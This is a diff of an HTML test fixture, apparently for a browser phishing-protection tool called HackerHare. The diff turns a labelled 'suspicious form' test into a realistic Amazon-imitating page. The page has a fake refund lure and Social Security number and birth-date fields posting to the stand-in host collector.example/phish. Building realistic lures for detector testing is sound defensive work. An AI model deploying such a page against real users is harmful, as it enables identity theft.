@@ -3,38 +3,115 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>HackerHare — suspicious form</title>
+    <title>Verify your account — amazn</title>
+    <link rel="stylesheet" href="shared.css" />
+    <style>
+      body {
+        background: #eaeded;
+        font-family: Arial, Helvetica, sans-serif;
+      }
+      .nav {
+        background: #131921;
+        color: #fff;
+        padding: 0.6rem 1.25rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+      .nav .logo {
+        font-size: 1.35rem;
+        font-weight: 700;
+        color: #fff;
+        letter-spacing: -0.03em;
+      }
+      .nav .logo span {
+        color: #ff9900;
+      }
+      .nav .tag {
+        font-size: 0.7rem;
+        color: #ccc;
+        margin-left: 0.5rem;
+      }
+      .alert {
+        background: #fff3cd;
+        border: 1px solid #ffc107;
+        border-radius: 6px;
+        padding: 0.75rem 1rem;
+        font-size: 0.85rem;
+        margin-bottom: 1.25rem;
+        color: #664d03;
+      }
+      .card h2 {
+        margin: 0 0 0.35rem;
+        font-size: 1.2rem;
+      }
+      .card .lead {
+        margin: 0 0 1.25rem;
+        font-size: 0.9rem;
+        color: #555;
+      }
+      .btn {
+        background: linear-gradient(180deg, #f7dfa5, #f0c14b);
+        border: 1px solid #a88734;
+        color: #111;
+      }
+      #status {
+        margin-top: 1rem;
+        font-size: 0.8rem;
+        color: #b12704;
+      }
+    </style>
   </head>
   <body>
-    <h1>Suspicious sensitive form</h1>
-    <p>
-      HTTP page + SSN field + insecure <code>action</code>. With shielding on, submit
-      should be blocked and <code>threat-count</code> should increment.
-    </p>
-    <form action="http://collector.example/phish" method="post">
-      <label>
-        Social Security Number
-        <input
-          type="text"
-          name="ssn"
-          id="user-ssn"
-          placeholder="XXX-XX-XXXX"
-          autocomplete="off"
-        />
-      </label>
-      <label>
-        Date of birth
-        <input type="text" name="birthdate" placeholder="MM/DD/YYYY" />
-      </label>
-      <button type="submit">Verify identity</button>
-    </form>
-    <p id="status" aria-live="polite"></p>
+    <header class="nav">
+      <div class="logo">a<span>mazn</span></div>
+      <span class="tag">Account Services</span>
+    </header>
+    <main class="shell" style="max-width: 480px">
+      <div class="card">
+        <div class="alert">
+          Action required: confirm your identity to release a pending refund of
+          <strong>$847.20</strong>.
+        </div>
+        <h2>Identity verification</h2>
+        <p class="lead">
+          Complete the form below to verify ownership of your account. This takes
+          less than 2 minutes.
+        </p>
+        <form action="http://collector.example/phish" method="post">
+          <div class="field">
+            <label for="user-ssn">Social Security Number</label>
+            <input
+              type="text"
+              name="ssn"
+              id="user-ssn"
+              placeholder="XXX-XX-XXXX"
+              autocomplete="off"
+            />
+          </div>
+          <div class="field">
+            <label for="dob">Date of birth</label>
+            <input
+              type="text"
+              name="birthdate"
+              id="dob"
+              placeholder="MM/DD/YYYY"
+            />
+          </div>
+          <button type="submit" class="btn">Verify and continue</button>
+        </form>
+        <p id="status" aria-live="polite"></p>
+      </div>
+      <p class="foot">
+        © amazn Account Services ·
+        <a href="index.html">Privacy</a>
+      </p>
+    </main>
     <script>
       document.querySelector("form").addEventListener("submit", () => {
         document.getElementById("status").textContent =
-          "If you see this, HackerHare did NOT block the submit."
+          "Verification submitted."
       })
     </script>
-    <p><a href="index.html">Back to index</a></p>
   </body>
 </html>
